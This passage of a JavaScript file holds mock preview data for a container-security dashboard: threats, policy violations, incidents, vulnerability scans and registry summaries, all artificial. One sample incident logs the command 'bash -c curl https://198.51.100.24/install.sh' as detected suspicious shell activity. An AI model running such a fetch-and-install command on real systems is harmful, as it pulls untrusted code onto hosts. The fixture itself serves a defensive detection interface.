const PREVIEW_GLOBAL_PERMISSIONS = [
  { id: 'config', read: true, write: true },
  { id: 'rt_policy', read: true, write: true },
  { id: 'rt_scan', read: true, write: true },
  { id: 'admctrl', read: true, write: true },
  { id: 'security_events', read: true, write: false },
  { id: 'reg_scan', read: true, write: true },
  { id: 'vulnerability', read: true, write: true },
  { id: 'compliance', read: true, write: true },
  { id: 'authorization', read: true, write: true },
  { id: 'authentication', read: true, write: true },
  { id: 'fed', read: true, write: true },
];

export const PREVIEW_USER = {
  emailHash: 'preview@microseg.local',
  roles: {
    global: 3,
  },
  global_permissions: PREVIEW_GLOBAL_PERMISSIONS,
  remote_global_permissions: [],
  domain_permissions: {},
  extra_permissions: [],
  is_suse_authenticated: false,
  token: {
    token: 'preview-token',
    username: 'preview.admin',
    role: 'admin',
    server: 'local',
    locale: 'zh_cn',
    timeout: 3600,
    global_permissions: PREVIEW_GLOBAL_PERMISSIONS,
    remote_global_permissions: [],
    domain_permissions: {},
    extra_permissions: [],
    default_password: false,
    password_days_until_expire: 28,
  },
};

export const PREVIEW_SUMMARY_RESPONSE = {
  summary: {
    platform: 'Kubernetes',
    hosts: 8,
    running_pods: 34,
    cvedb_version: '2026.04.01',
    cvedb_create_time: '2026-04-01T00:00:00Z',
    component_versions: ['5.4.0', '5.4.0'],
  },
};

export const PREVIEW_CLUSTER_DATA = {
  fed_role: '',
  clusters: [
    {
      id: 'preview-local',
      name: 'preview-local',
      clusterType: 'master',
      rest_version: '5.4.0',
      status: 'active',
    },
  ],
};

export const PREVIEW_CONFIG_V2_RESPONSE = {
  config: {
    misc: {
      cluster_name: 'preview-local',
      no_telemetry_report: true,
    },
  },
};

export const PREVIEW_DASHBOARD_SCORES = {
  security_scores: {
    security_risk_score: 36,
    service_mode_score_by_100: 28,
    exposure_score_by_100: 41,
    vulnerability_score_by_100: 39,
  },
  metrics: {
    groups: {
      discover_groups: 2,
      discover_groups_zero_drift: 1,
      monitor_groups: 6,
      monitor_groups_zero_drift: 4,
      protect_groups: 18,
      protect_groups_zero_drift: 12,
    },
    workloads: {
      discover_ext_eps: 7,
      threat_ext_eps: 2,
      violate_ext_eps: 3,
    },
    cves: {
      discover_cves: 19,
      monitor_cves: 7,
      protect_cves: 3,
    },
  },
  ingress: [
    {
      service: 'frontend',
      display_name: 'frontend-6c7f7f6d9b-4xq8p',
      pod_name: 'frontend-6c7f7f6d9b-4xq8p',
      policy_mode: 'monitor',
      policy_action: 'allow',
      high: 3,
      medium: 6,
      entries: [
        {
          client_ip: '203.0.113.10',
          fqdn: 'edge-apac.example.com',
          port: '443',
          bytes: 2481300,
          application: 'HTTPS',
          sessions: 128,
          policy_action: 'allow',
          last_seen_at: 1775232000,
        },
      ],
    },
    {
      service: 'checkout',
      display_name: 'checkout-74fc8c77f6-vjr4w',
      pod_name: 'checkout-74fc8c77f6-vjr4w',
      policy_mode: 'protect',
      policy_action: 'violate',
      high: 5,
      medium: 4,
      entries: [
        {
          client_ip: '198.51.100.24',
          fqdn: 'partner-gateway.example.com',
          port: '8443',
          bytes: 1844000,
          application: 'TLS',
          sessions: 46,
          policy_action: 'violate',
          last_seen_at: 1775231400,
        },
      ],
    },
  ],
  egress: [
    {
      service: 'frontend',
      display_name: 'frontend-6c7f7f6d9b-4xq8p',
      pod_name: 'frontend-6c7f7f6d9b-4xq8p',
      policy_mode: 'monitor',
      policy_action: 'allow',
      high: 1,
      medium: 2,
      entries: [
        {
          server_ip: '198.51.100.80',
          fqdn: 'auth.example.com',
          port: '443',
          bytes: 923100,
          application: 'HTTPS',
          sessions: 31,
          policy_action: 'allow',
          last_seen_at: 1775231300,
        },
      ],
    },
    {
      service: 'inventory',
      display_name: 'inventory-5f7dd79c77-9l6xq',
      pod_name: 'inventory-5f7dd79c77-9l6xq',
      policy_mode: 'discover',
      policy_action: 'deny',
      high: 2,
      medium: 3,
      entries: [
        {
          server_ip: '203.0.113.99',
          fqdn: 'legacy-api.example.com',
          port: '1521',
          bytes: 611400,
          application: 'Oracle',
          sessions: 9,
          policy_action: 'deny',
          last_seen_at: 1775230800,
        },
      ],
    },
  ],
};

export const PREVIEW_DASHBOARD_DETAILS = {
  autoScanConfig: true,
  highPriorityVulnerabilities: {
    containers: {
      top5Containers: [
        {
          display_name: 'frontend-6c7f7f6d9b-4xq8p',
          high4Dashboard: 9,
          medium4Dashboard: 14,
        },
        {
          display_name: 'checkout-74fc8c77f6-vjr4w',
          high4Dashboard: 7,
          medium4Dashboard: 11,
        },
        {
          display_name: 'inventory-5f7dd79c77-9l6xq',
          high4Dashboard: 6,
          medium4Dashboard: 9,
        },
      ],
    },
    nodes: {
      top5Nodes: [
        { name: 'aks-nodepool-01', scan_summary: { high: 4, medium: 10 } },
        { name: 'aks-nodepool-02', scan_summary: { high: 3, medium: 8 } },
      ],
    },
  },
  containers: [
    { state: 'protect' },
    { state: 'protect' },
    { state: 'protect' },
    { state: 'monitor' },
    { state: 'monitor' },
    { state: 'discover' },
    { state: 'quarantined' },
  ],
  services: [{ name: 'frontend' }, { name: 'checkout' }, { name: 'inventory' }],
  applications2: [
    ['HTTPS', { count: 182, totalBytes: 2481300 }],
    ['TLS', { count: 96, totalBytes: 1844000 }],
    ['MySQL', { count: 54, totalBytes: 801200 }],
    ['Redis', { count: 28, totalBytes: 241000 }],
  ],
};

export const PREVIEW_DASHBOARD_NOTIFICATIONS = {
  criticalSecurityEvents: {
    summary: {
      critical: [
        ['04/01', 3],
        ['04/02', 2],
        ['04/03', 5],
        ['04/04', 4],
      ],
      warning: [
        ['04/01', 7],
        ['04/02', 5],
        ['04/03', 8],
        ['04/04', 6],
      ],
    },
    top_security_events: {
      source: [
        [
          { source_workload_name: 'frontend' },
          { source_workload_name: 'frontend' },
          { source_workload_name: 'frontend' },
        ],
        [
          { source_workload_name: 'checkout' },
          { source_workload_name: 'checkout' },
        ],
        [{ source_workload_name: 'inventory' }],
      ],
      destination: [
        [
          { destination_workload_name: 'payment' },
          { destination_workload_name: 'payment' },
          { destination_workload_name: 'payment' },
        ],
        [
          { destination_workload_name: 'auth' },
          { destination_workload_name: 'auth' },
        ],
        [{ destination_workload_name: 'legacy-db' }],
      ],
    },
  },
};

export const PREVIEW_SECURITY_EVENTS_RAW = [
  JSON.stringify({
    threats: [
      {
        id: 'threat-1',
        name: 'SQL Injection Attempt',
        target: 'server',
        client_workload_domain: '',
        client_workload_id: 'external',
        client_workload_name: 'external',
        client_ip: '203.0.113.10',
        client_port: 54123,
        client_workload_service: '',
        server_workload_domain: 'production',
        server_workload_id: 'workload-frontend',
        server_workload_name: 'frontend',
        server_ip: '10.42.1.10',
        server_port: 443,
        server_conn_port: 443,
        server_workload_service: 'frontend',
        application: 'HTTPS',
        level: 'Critical',
        severity: 'Critical',
        action: 'block',
        count: 3,
        cluster_name: 'preview-local',
        message: 'Malicious request pattern matched against service policy.',
        cap_len: 128,
        host_id: 'host-01',
        host_name: 'aks-nodepool-01',
        enforcer_id: 'enforcer-01',
        enforcer_name: 'enforcer-01',
        reported_at: '2026-04-04T09:12:00Z',
        reported_timestamp: 1775293920,
      },
      {
        id: 'threat-2',
        name: 'Suspicious API Burst',
        target: 'client',
        client_workload_domain: 'staging',
        client_workload_id: 'workload-checkout',
        client_workload_name: 'checkout',
        client_ip: '10.42.2.12',
        client_port: 51922,
        client_workload_service: 'checkout',
        server_workload_domain: '',
        server_workload_id: 'external',
        server_workload_name: 'external',
        server_ip: '198.51.100.24',
        server_port: 443,
        server_conn_port: 443,
        server_workload_service: '',
        application: 'HTTPS',
        level: 'High',
        severity: 'High',
        action: 'monitor',
        count: 2,
        cluster_name: 'preview-local',
        message: 'Outbound connection volume exceeded learned baseline.',
        cap_len: 64,
        host_id: 'host-02',
        host_name: 'aks-nodepool-02',
        enforcer_id: 'enforcer-02',
        enforcer_name: 'enforcer-02',
        reported_at: '2026-04-04T08:48:00Z',
        reported_timestamp: 1775292480,
      },
    ],
  }),
  JSON.stringify({
    violations: [
      {
        policy_id: 201,
        nbe: false,
        client_domain: 'production',
        client_id: 'workload-frontend',
        client_name: 'frontend',
        client_ip: '10.42.1.10',
        client_service: 'frontend',
        server_domain: 'production',
        server_id: 'workload-payment',
        server_name: 'payment',
        server_ip: '10.42.3.22',
        server_port: 8443,
        server_service: 'payment',
        applications: ['TLS'],
        host_id: 'host-01',
        host_name: 'aks-nodepool-01',
        enforcer_id: 'enforcer-01',
        enforcer_name: 'enforcer-01',
        reported_at: '2026-04-04T08:15:00Z',
        reported_timestamp: 1775290500,
        level: 'High',
        cluster_name: 'preview-local',
        policy_action: 'deny',
        ip_proto: 6,
        server_image: 'payment:v2.4.1',
        fqdn: '',
      },
      {
        policy_id: 0,
        nbe: true,
        client_domain: 'staging',
        client_id: 'workload-checkout',
        client_name: 'checkout',
        client_ip: '10.42.2.12',
        client_service: 'checkout',
        server_domain: 'production',
        server_id: 'workload-inventory',
        server_name: 'inventory',
        server_ip: '10.42.4.31',
        server_port: 8080,
        server_service: 'inventory',
        applications: ['HTTP'],
        host_id: 'host-02',
        host_name: 'aks-nodepool-02',
        enforcer_id: 'enforcer-02',
        enforcer_name: 'enforcer-02',
        reported_at: '2026-04-04T07:31:00Z',
        reported_timestamp: 1775287860,
        level: 'Medium',
        cluster_name: 'preview-local',
        policy_action: 'violate',
        ip_proto: 6,
        server_image: 'inventory:v1.8.3',
        fqdn: '',
      },
    ],
  }),
  JSON.stringify({
    incidents: [
      {
        name: 'Container.Suspicious.Process',
        conn_ingress: false,
        remote_workload_domain: '',
        remote_workload_id: 'external',
        remote_workload_name: 'external',
        server_ip: '203.0.113.99',
        server_port: 443,
        server_conn_port: 443,
        remote_workload_service: '',
        workload_domain: 'production',
        workload_id: 'workload-frontend',
        workload_name: 'frontend',
        client_ip: '10.42.1.10',
        client_port: 46291,
        workload_service: 'frontend',
        host_name: 'aks-nodepool-01',
        host_id: 'host-01',
        enforcer_id: 'enforcer-01',
        enforcer_name: 'enforcer-01',
        level: 'Critical',
        cluster_name: 'preview-local',
        action: 'alert',
        message:
          'Unexpected shell activity detected inside protected container.',
        group: 'nv.frontend',
        proc_name: 'bash',
        proc_path: '/usr/bin/bash',
        proc_cmd: 'bash -c curl https://198.51.100.24/install.sh',
        proc_effective_uid: '0',
        proc_effective_user: 'root',
        ip_proto: 'tcp',
        file_path: '/tmp/install.sh',
        file_name: ['install.sh'],
        count: 1,
        reported_at: '2026-04-04T06:54:00Z',
        reported_timestamp: 1775285640,
      },
      {
        name: 'Host.File.Modified',
        conn_ingress: false,
        remote_workload_domain: '',
        remote_workload_id: '',
        remote_workload_name: '',
        server_ip: '',
        server_port: 0,
        server_conn_port: 0,
        remote_workload_service: '',
        workload_domain: '',
        workload_id: 'Host:aks-nodepool-02',
        workload_name: 'Host:aks-nodepool-02',
        client_ip: '10.42.9.11',
        client_port: 0,
        workload_service: '',
        host_name: 'aks-nodepool-02',
        host_id: 'host-02',
        enforcer_id: 'enforcer-02',
        enforcer_name: 'enforcer-02',
        level: 'Warning',
        cluster_name: 'preview-local',
        action: 'alert',
        message: 'Critical configuration file changed on protected host.',
        group: 'nodes',
        proc_name: 'vim',
        proc_path: '/usr/bin/vim',
        proc_cmd: 'vim /etc/kubernetes/manifests/kube-apiserver.yaml',
        proc_effective_uid: '0',
        proc_effective_user: 'root',
        ip_proto: '',
        file_path: '/etc/kubernetes/manifests/kube-apiserver.yaml',
        file_name: ['kube-apiserver.yaml'],
        count: 1,
        reported_at: '2026-04-04T06:18:00Z',
        reported_timestamp: 1775283480,
      },
    ],
  }),
];

export const PREVIEW_IP_GEO_RESPONSE = {
  ip_map: {
    '203.0.113.10': { country_code: 'US', country_name: 'United States' },
    '198.51.100.24': { country_code: 'DE', country_name: 'Germany' },
    '198.51.100.80': { country_code: 'SG', country_name: 'Singapore' },
    '203.0.113.99': { country_code: 'JP', country_name: 'Japan' },
  },
};

export const PREVIEW_HOST_RESPONSE = {
  host: {
    id: 'host-01',
    name: 'aks-nodepool-01',
    display_name: 'aks-nodepool-01',
    state: 'online',
    platform: 'Kubernetes',
    runtime: 'containerd',
    kernel: '5.15.0',
    os: 'Ubuntu 22.04',
    cpus: 8,
    memory: 34359738368,
  },
};

export const PREVIEW_CONTAINER_RESPONSE = {
  workload: {
    id: 'workload-frontend',
    display_name: 'frontend-6c7f7f6d9b-4xq8p',
    domain: 'production',
    service: 'frontend',
    image: 'frontend:v2.1.0',
    state: 'running',
    host_name: 'aks-nodepool-01',
    policy_mode: 'monitor',
  },
};

export const PREVIEW_ENFORCER_RESPONSE = {
  enforcer: {
    id: 'enforcer-01',
    display_name: 'enforcer-01',
    host_name: 'aks-nodepool-01',
    state: 'connected',
    version: '5.4.0',
  },
};

export const PREVIEW_PACKET_RESPONSE = {
  threat: {
    packet:
      '4500003c1c4640004006b1e6c633640ac0a8010a005001bb7c3b80a500000000a0027210d9b10000020405b40402080a4e6f77000000000001030307',
  },
};

export const PREVIEW_PROCESS_PROFILE_RESPONSE = {
  process_profile: {
    process_list: [
      {
        name: 'bash',
        path: '/usr/bin/bash',
        action: 'allow',
        cfg_type: 'learned',
      },
    ],
  },
};

export const PREVIEW_POLICY_RULE_RESPONSE = {
  rule: {
    id: 201,
    from: 'nv.frontend',
    to: 'nv.payment',
    applications: ['TLS'],
    ports: 'tcp/8443',
    action: 'deny',
    cfg_type: 'user_created',
    last_modified_timestamp: 1775289600,
  },
};

export const PREVIEW_DOMAINS_RESPONSE = {
  domains: [{ name: 'production' }, { name: 'staging' }, { name: '_images' }],
};

export const PREVIEW_SYSTEM_ALERTS = {
  acceptable_alerts: {},
  accepted_alerts: [],
};

export const PREVIEW_REBRAND_RESPONSE = {};

export const PREVIEW_SCAN_CONFIG_RESPONSE = {
  config: {
    auto_scan: true,
    enable_auto_scan_workload: true,
  },
};

export const PREVIEW_SCANNED_WORKLOADS = [
  {
    brief: {
      author: 'platform-team',
      display_name: 'frontend-6c7f7f6d9b-4xq8p',
      domain: 'production',
      host_id: 'host-01',
      host_name: 'aks-nodepool-01',
      id: 'workload-frontend',
      image: 'harbor.local/security/frontend:v2.1.0',
      image_id: 'sha256:frontend',
      image_created_at: '2026-04-03T08:15:00Z',
      image_reg_scanned: true,
      name: 'frontend',
      service: 'frontend',
      service_group: 'nv.frontend',
      state: 'running',
    },
    children: [
      {
        brief: {
          author: 'platform-team',
          display_name: 'frontend-sidecar',
          domain: 'production',
          host_id: 'host-01',
          host_name: 'aks-nodepool-01',
          id: 'workload-frontend-sidecar',
          image: 'harbor.local/security/mesh-sidecar:v1.2.4',
          image_id: 'sha256:frontend-sidecar',
          image_created_at: '2026-04-01T06:12:00Z',
          image_reg_scanned: true,
          name: 'frontend-sidecar',
          service: 'frontend',
          service_group: 'nv.frontend',
          state: 'running',
        },
        platform_role: '',
        rt_attributes: {
          applications: ['Envoy'],
          pod_name: 'frontend-6c7f7f6d9b-4xq8p',
          privileged: false,
          run_as_root: false,
        },
        security: {
          cap_change_mode: true,
          cap_quarantine: true,
          cap_sniff: true,
          policy_mode: 'monitor',
          profile_mode: 'monitor',
          scan_summary: {
            status: 'finished',
            high: 0,
            medium: 1,
            scanned_at: '2026-04-04T08:42:00Z',
            scanned_timestamp: 1775292120,
          },
          service_mesh: true,
          service_mesh_sidecar: true,
        },
      },
    ],
    platform_role: '',
    rt_attributes: {
      applications: ['HTTPS', 'HTTP'],
      interfaces: {
        eth0: [{ ip: '10.42.1.10', ip_prefix: 24, gateway: '10.42.1.1' }],
      },
      labels: {
        app: 'frontend',
        tier: 'edge',
      },
      memory_limit: 536870912,
      network_mode: 'bridge',
      pod_name: 'frontend-6c7f7f6d9b-4xq8p',
      ports: [
        {
          host_ip: '0.0.0.0',
          host_port: 30443,
          ip_proto: 6,
          port: 443,
        },
      ],
      privileged: false,
      run_as_root: false,
      service_account: 'frontend-sa',
    },
    security: {
      cap_change_mode: true,
      cap_quarantine: true,
      cap_sniff: true,
      policy_mode: 'monitor',
      profile_mode: 'monitor',
      scan_summary: {
        status: 'finished',
        high: 4,
        medium: 9,
        hidden_high: 1,
        hidden_medium: 2,
        scanned_at: '2026-04-04T08:42:00Z',
        scanned_timestamp: 1775292120,
      },
      service_mesh: true,
      service_mesh_sidecar: false,
    },
    started_at: '2026-04-04T02:15:00Z',
  },
  {
    brief: {
      author: 'platform-team',
      display_name: 'checkout-74fc8c77f6-vjr4w',
      domain: 'staging',
      host_id: 'host-02',
      host_name: 'aks-nodepool-02',
      id: 'workload-checkout',
      image: 'harbor.local/security/checkout:v2.4.1',
      image_id: 'sha256:checkout',
      image_created_at: '2026-04-02T14:30:00Z',
      image_reg_scanned: true,
      name: 'checkout',
      service: 'checkout',
      service_group: 'nv.checkout',
      state: 'running',
    },
    children: [],
    platform_role: '',
    rt_attributes: {
      applications: ['HTTP', 'gRPC'],
      interfaces: {
        eth0: [{ ip: '10.42.2.12', ip_prefix: 24, gateway: '10.42.2.1' }],
      },
      labels: {
        app: 'checkout',
        tier: 'service',
      },
      memory_limit: 805306368,
      network_mode: 'bridge',
      pod_name: 'checkout-74fc8c77f6-vjr4w',
      ports: [
        {
          host_ip: '0.0.0.0',
          host_port: 30080,
          ip_proto: 6,
          port: 8080,
        },
      ],
      privileged: false,
      run_as_root: false,
      service_account: 'checkout-sa',
    },
    security: {
      cap_change_mode: true,
      cap_quarantine: true,
      cap_sniff: true,
      policy_mode: 'protect',
      profile_mode: 'protect',
      scan_summary: {
        status: 'finished',
        high: 7,
        medium: 11,
        scanned_at: '2026-04-04T07:58:00Z',
        scanned_timestamp: 1775289480,
      },
      service_mesh: false,
      service_mesh_sidecar: false,
    },
    started_at: '2026-04-04T03:05:00Z',
  },
  {
    brief: {
      author: 'platform-team',
      display_name: 'inventory-5f7dd79c77-9l6xq',
      domain: 'production',
      host_id: 'host-01',
      host_name: 'aks-nodepool-01',
      id: 'workload-inventory',
      image: 'harbor.local/security/inventory:v1.8.3',
      image_id: 'sha256:inventory',
      image_created_at: '2026-03-30T09:08:00Z',
      image_reg_scanned: true,
      name: 'inventory',
      service: 'inventory',
      service_group: 'nv.inventory',
      state: 'quarantined',
    },
    children: [],
    platform_role: '',
    rt_attributes: {
      applications: ['HTTP', 'MySQL'],
      interfaces: {
        eth0: [{ ip: '10.42.4.31', ip_prefix: 24, gateway: '10.42.4.1' }],
      },
      labels: {
        app: 'inventory',
        tier: 'service',
      },
      memory_limit: 536870912,
      network_mode: 'bridge',
      pod_name: 'inventory-5f7dd79c77-9l6xq',
      ports: [
        {
          host_ip: '0.0.0.0',
          host_port: 30081,
          ip_proto: 6,
          port: 8080,
        },
      ],
      privileged: false,
      run_as_root: false,
      service_account: 'inventory-sa',
    },
    security: {
      cap_change_mode: true,
      cap_quarantine: true,
      cap_sniff: true,
      policy_mode: 'discover',
      profile_mode: 'monitor',
      quarantine_reason: 'Unexpected egress and suspicious process',
      scan_summary: {
        status: 'finished',
        high: 5,
        medium: 8,
        scanned_at: '2026-04-04T06:10:00Z',
        scanned_timestamp: 1775283000,
      },
      service_mesh: false,
      service_mesh_sidecar: false,
    },
    started_at: '2026-04-03T21:42:00Z',
  },
];

export const PREVIEW_WORKLOAD_COMPLIANCE_RESPONSE = {
  items: [
    {
      test_number: '5.7',
      level: 'WARN',
      message: ['Host IPC namespace is shared with the container.'],
      description: 'Review pod isolation settings and disable host IPC.',
      remediation: 'Set hostIPC to false in the workload specification.',
    },
    {
      test_number: '5.21',
      level: 'PASS',
      message: ['Container is not running as privileged.'],
      description: 'Privilege escalation protections are correctly configured.',
      remediation: '',
    },
  ],
};

export const PREVIEW_WORKLOAD_VUL_REPORT = {
  report: {
    vulnerabilities: [
      {
        name: 'CVE-2026-10001',
        severity: 'High',
        description: 'Remote code execution in sample web framework parser.',
        feed_rating: 'High',
        package_name: 'sample-web',
        package_version: '2.4.0',
        fixed_version: '2.4.4',
        link: 'https://security.example.local/CVE-2026-10001',
        score: 7.8,
        score_v3: 8.3,
        vectors: 'AV:N/AC:L/Au:N/C:P/I:P/A:P',
        vectors_v3: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:L',
        published_timestamp: 1775000000,
        last_modified_timestamp: 1775200000,
        in_base_image: true,
        file_name: '/usr/lib/sample-web/parser.so',
        tags: [],
      },
      {
        name: 'CVE-2026-10019',
        severity: 'Medium',
        description: 'Cookie validation weakness in gateway helper.',
        feed_rating: 'Medium',
        package_name: 'gateway-helper',
        package_version: '1.8.1',
        fixed_version: '1.8.3',
        link: 'https://security.example.local/CVE-2026-10019',
        score: 5.4,
        score_v3: 6.1,
        vectors: 'AV:N/AC:M/Au:N/C:P/I:P/A:N',
        vectors_v3: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:L/A:N',
        published_timestamp: 1774900000,
        last_modified_timestamp: 1775150000,
        in_base_image: false,
        file_name: '/app/node_modules/gateway-helper/index.js',
        tags: [],
      },
    ],
  },
};

export const PREVIEW_PROCESS_RESPONSE = {
  processes: [
    {
      name: 'node',
      pid: 1811,
      parent: 1,
      group: 1811,
      session: 1811,
      cmdline: 'node server.js',
      root: false,
      user: 'node',
      status: 'running',
      start_timestamp: 1775286000,
      action: 'allow',
    },
    {
      name: 'nginx',
      pid: 47,
      parent: 1,
      group: 47,
      session: 47,
      cmdline: 'nginx: master process nginx -g daemon off;',
      root: true,
      user: 'root',
      status: 'running',
      start_timestamp: 1775282400,
      action: 'allow',
    },
  ],
};

export const PREVIEW_PROCESS_HISTORY_RESPONSE = {
  processes: [
    ...PREVIEW_PROCESS_RESPONSE.processes,
    {
      name: 'sh',
      pid: 2098,
      parent: 1811,
      group: 2098,
      session: 2098,
      cmdline: 'sh -c ls /tmp',
      root: false,
      user: 'node',
      status: 'exited',
      start_timestamp: 1775293000,
      action: 'alert',
    },
  ],
};

export const PREVIEW_REGISTRY_TYPES = {
  list: {
    registry_type: ['Docker Registry', 'Harbor', 'Gitlab'],
  },
};

export const PREVIEW_REGISTRY_SUMMARIES = {
  summarys: [
    {
      auth_token: '',
      auth_with_token: false,
      cvedb_create_time: '2026-04-01T00:00:00Z',
      cvedb_version: '2026.04.01',
      domains: 'production,staging',
      error_detail: '',
      error_message: '',
      failed: 0,
      filters: ['frontend', 'checkout', 'inventory'],
      gitlab_external_url: '',
      gitlab_private_token: '',
      ibm_cloud_account: '',
      ibm_cloud_token_url: '',
      ignore_proxy: false,
      jfrog_aql: false,
      jfrog_mode: '',
      name: 'harbor-main',
      password: '',
      registry: 'harbor.local',
      registry_type: 'Docker Registry',
      repo_limit: 20,
      rescan_after_db_update: true,
      scan_layers: true,
      scanned: 18,
      scanning: 1,
      schedule: {
        interval: 12,
        schedule: '0 */12 * * *',
      },
      scheduled: 2,
      started_at: '2026-04-04T04:00:00Z',
      status: 'scanning',
      tag_limit: 6,
      username: 'scanner',
      use_proxy: true,
      cfg_type: 'ground',
    },
    {
      auth_token: '',
      auth_with_token: false,
      cvedb_create_time: '2026-04-01T00:00:00Z',
      cvedb_version: '2026.04.01',
      domains: 'production',
      error_detail: '',
      error_message: '',
      failed: 1,
      filters: ['base', 'gateway'],
      gitlab_external_url: '',
      gitlab_private_token: '',
      ibm_cloud_account: '',
      ibm_cloud_token_url: '',
      ignore_proxy: true,
      jfrog_aql: false,
      jfrog_mode: '',
      name: 'dockerhub-edge',
      password: '',
      registry: 'registry-1.docker.io',
      registry_type: 'Docker Registry',
      repo_limit: 10,
      rescan_after_db_update: true,
      scan_layers: true,
      scanned: 7,
      scanning: 0,
      schedule: {
        interval: 24,
        schedule: '0 0 * * *',
      },
      scheduled: 0,
      started_at: '2026-04-03T20:00:00Z',
      status: 'finished',
      tag_limit: 3,
      username: 'readonly',
      use_proxy: false,
      cfg_type: 'user_created',
    },
  ],
};

export const PREVIEW_REGISTRY_REPO_RESPONSE = {
  images: [
    {
      author: 'platform-team',
      base_os: 'Ubuntu 22.04',
      created_at: '2026-04-03T08:15:00Z',
      cvedb_create_time: '2026-04-01T00:00:00Z',
      digest: 'sha256:frontend',
      domain: 'production',
      envs: ['NODE_ENV=production', 'PORT=443'],
      high: 4,
      image_id: 'sha256:frontend',
      labels: {
        app: ['frontend'],
      },
      layers: [],
      medium: 9,
      repository: 'frontend',
      result: 'finished',
      run_as_root: false,
      scanned_at: '2026-04-04T08:42:00Z',
      scanned_timestamp: 1775292120,
      scanner_version: '5.4.0',
      size: 386547056,
      status: 'finished',
      tag: 'v2.1.0',
    },
    {
      author: 'platform-team',
      base_os: 'Alpine 3.20',
      created_at: '2026-04-02T14:30:00Z',
      cvedb_create_time: '2026-04-01T00:00:00Z',
      digest: 'sha256:checkout',
      domain: 'staging',
      envs: ['APP_MODE=staging'],
      high: 7,
      image_id: 'sha256:checkout',
      labels: {
        app: ['checkout'],
      },
      layers: [],
      medium: 11,
      repository: 'checkout',
      result: 'finished',
      run_as_root: false,
      scanned_at: '2026-04-04T07:58:00Z',
      scanned_timestamp: 1775289480,
      scanner_version: '5.4.0',
      size: 241172480,
      status: 'finished',
      tag: 'v2.4.1',
    },
    {
      author: 'platform-team',
      base_os: 'Ubuntu 22.04',
      created_at: '2026-03-30T09:08:00Z',
      cvedb_create_time: '2026-04-01T00:00:00Z',
      digest: 'sha256:inventory',
      domain: 'production',
      envs: ['JAVA_OPTS=-Xmx256m'],
      high: 5,
      image_id: 'sha256:inventory',
      labels: {
        app: ['inventory'],
      },
      layers: [],
      medium: 8,
      repository: 'inventory',
      result: 'finished',
      run_as_root: false,
      scanned_at: '2026-04-04T06:10:00Z',
      scanned_timestamp: 1775283000,
      scanner_version: '5.4.0',
      size: 517996544,
      status: 'finished',
      tag: 'v1.8.3',
    },
  ],
};

export const PREVIEW_REGISTRY_IMAGE_DETAIL_RESPONSE = {
  report: {
    checks: [],
    cmds: ['FROM ubuntu:22.04', 'COPY dist /app', 'CMD ["node","server.js"]'],
    envs: ['NODE_ENV=production', 'PORT=443'],
    labels: {
      app: ['frontend'],
      owner: ['platform-team'],
    },
    modules: [
      {
        name: 'sample-web',
        source: 'npm',
        version: '2.4.0',
        cves: [
          {
            name: 'CVE-2026-10001',
            status: 'open',
          },
        ],
      },
    ],
    secrets: [],
    setid_perms: [],
    vulnerabilities: PREVIEW_WORKLOAD_VUL_REPORT.report.vulnerabilities,
  },
};

export const PREVIEW_REGISTRY_LAYER_DETAIL_RESPONSE = {
  report: {
    layers: [
      {
        cmds: 'COPY dist /app',
        digest: 'sha256:layer-frontend',
        size: 186646528,
        verifiers: ['internal-sigstore'],
        verificationTimestamp: '2026-04-04T08:42:00Z',
        vulnerabilities: PREVIEW_WORKLOAD_VUL_REPORT.report.vulnerabilities,
      },
    ],
  },
};

export const PREVIEW_ALL_SCANNED_IMAGES_SUMMARY_RESPONSE = {
  query_token: 'preview-images-query',
  total_matched_records: 3,
  total_records: 3,
  status: 'ready',
  summary: {
    count_distribution: {
      high: 16,
      medium: 28,
      low: 9,
      container: 3,
      image: 3,
      node: 2,
      platform: 1,
    },
    top_images: [
      {
        index: 0,
        display_name: 'checkout:v2.4.1',
        high: 7,
        medium: 11,
        low: 2,
      },
      {
        index: 1,
        display_name: 'inventory:v1.8.3',
        high: 5,
        medium: 8,
        low: 3,
      },
      { index: 2, display_name: 'frontend:v2.1.0', high: 4, medium: 9, low: 4 },
    ],
    top_nodes: [
      {
        index: 0,
        display_name: 'aks-nodepool-01',
        high: 9,
        medium: 17,
        low: 4,
      },
      {
        index: 1,
        display_name: 'aks-nodepool-02',
        high: 7,
        medium: 11,
        low: 5,
      },
    ],
  },
};

export const PREVIEW_ALL_SCANNED_IMAGES_RESPONSE = {
  data: PREVIEW_REGISTRY_REPO_RESPONSE.images,
  type: 'image',
  qf_matched_records: 3,
};

export const PREVIEW_CVE_PROFILE_RESPONSE = {
  profiles: [
    {
      name: 'default',
      cfg_type: 'ground',
      entries: [],
    },
  ],
};

export const PREVIEW_VUL_QUERY_DATA = {
  query_token: 'preview-vul-query',
  total_matched_records: 4,
  total_records: 4,
  status: 'ready',
  summary: {
    count_distribution: {
      high: 2,
      medium: 1,
      low: 1,
      container: 3,
      image: 3,
      node: 2,
      platform: 1,
    },
    top_images: [
      { index: 0, display_name: 'checkout:v2.4.1', high: 1, medium: 1, low: 0 },
      { index: 1, display_name: 'frontend:v2.1.0', high: 1, medium: 0, low: 1 },
      {
        index: 2,
        display_name: 'inventory:v1.8.3',
        high: 0,
        medium: 0,
        low: 1,
      },
    ],
    top_nodes: [
      { index: 0, display_name: 'aks-nodepool-01', high: 1, medium: 1, low: 1 },
      { index: 1, display_name: 'aks-nodepool-02', high: 1, medium: 0, low: 0 },
    ],
  },
};

export const PREVIEW_VUL_QUERY_SESSION = {
  qf_matched_records: 4,
  vulnerabilities: [
    {
      name: 'CVE-2026-10001',
      severity: 'High',
      description: 'Remote code execution in sample web framework parser.',
      feed_rating: 'High',
      packages: {},
      link: 'https://security.example.local/CVE-2026-10001',
      score: 7.8,
      score_v3: 8.3,
      vectors: 'AV:N/AC:L/Au:N/C:P/I:P/A:P',
      vectors_v3: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:L',
      published_timestamp: 1775000000,
      last_modified_timestamp: 1775200000,
      package_name: 'sample-web',
      workloads: [
        {
          id: 'workload-frontend',
          display_name: 'frontend-6c7f7f6d9b-4xq8p',
          image: 'harbor.local/security/frontend:v2.1.0',
          policy_mode: 'monitor',
        },
      ],
      nodes: [{ id: 'host-01', display_name: 'aks-nodepool-01' }],
      images: [{ id: 'sha256:frontend', display_name: 'frontend:v2.1.0' }],
      platforms: [{ id: 'platform-01', display_name: 'Kubernetes cluster' }],
      filteredWorkloads: [],
      filteredImages: [],
    },
    {
